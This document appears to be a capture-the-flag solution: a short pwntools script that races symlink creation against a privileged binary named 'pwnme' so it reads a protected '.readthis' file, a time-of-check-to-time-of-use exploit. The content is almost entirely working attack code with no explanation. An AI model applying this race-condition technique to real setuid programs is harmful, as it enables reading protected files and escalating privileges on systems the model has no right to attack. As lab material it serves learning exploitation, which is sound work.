```sh
touch pwn && python solution.py
```

```py
#!/usr/bin/python
from pwn import *
import os

context.arch = 'i386'
context.terminal = ['tmux']
context.os = 'linux'
context.bits = 32

path = "/home/tux/0x02/"
myfile = path + "pwn"
targetfile = path + ".readthis"
link = 'f'

def set_sym(filename):
	try:
		os.symlink(filename, link)
	except:
		log.info("Failed to set sym link: {0}".format(filename))

def run_bin():
	p = process([path + 'pwnme', link])
	log.info(p.recv())
	p.close()

threads = [
	threading.Thread(target=set_sym,args=(myfile,)),
	threading.Thread(target=run_bin),
	threading.Thread(target=set_sym,args=(targetfile,))	
]

for t in threads:
	t.start()

for t in threads:
	t.join()
```